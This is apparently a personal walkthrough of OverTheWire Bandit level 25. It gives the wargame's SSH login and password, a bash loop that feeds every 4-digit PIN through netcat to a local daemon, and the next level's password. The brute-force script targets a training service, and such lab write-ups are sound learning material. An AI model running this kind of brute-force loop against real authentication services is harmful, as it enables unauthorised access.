Level #25 brute-force a 4 digit pincode (ended up using bash)

A daemon is listening on port 30002  waiting to receive bandit24 password and a secret 4 digit code

- Server: bandit.labs.overthewire.org
- User: bandit24
- Password: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

ssh bandit24@bandit.labs.overthewire.org -p 2220
//created a shell script that looped over numbers from 0000 to 9999 and used as prefix 'VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar '
//this solution kept freezing so I divided the range from 0000 to 5000 then 5001 to 9999
//the results were divided into to files responses.txt and responses2.txt
//then used grep -v "Wrong!" to filter unsuccsesful attempts

contents of shell script:
#!/bin/bash
for iterator in {0000..5000}
do
	echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $iterator
done | netcat 127.0.0.1 30002 > responses.txt

#!/bin/bash
for iterator in {5001..9999}
do
	echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $iterator
done | netcat 127.0.0.1 30002 > responses2.txt

then executed:

grep -v "Wrong!" responses.txt
grep -v "Wrong!" responses2.txt

bandit25 user password: p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
